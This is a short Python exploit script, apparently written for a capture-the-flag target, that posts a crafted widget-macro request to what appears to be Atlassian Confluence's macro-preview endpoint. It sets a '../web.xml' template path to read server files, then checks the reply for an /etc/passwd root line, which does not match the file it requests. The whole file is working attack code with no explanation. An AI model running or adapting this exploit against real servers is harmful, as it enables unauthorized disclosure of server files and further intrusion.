import requests

url = 'http://node4.buuoj.cn:27514/'

data = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'
request = requests.request('POST',url + "rest/tinymce/1/macro/preview", data=data, headers={
                        "User-Agent"        : "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                        "Referer"           : url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
                        "Content-Type"      : "application/json; charset=utf-8",
                        'X-Atlassian-Token' : 'no-check'
                        })

if request.status_code == 200 and 'root:x:0:0:root' in request.text:
    print('yes')

else:
    print('no')



print(request.status_code)
print(request.text)

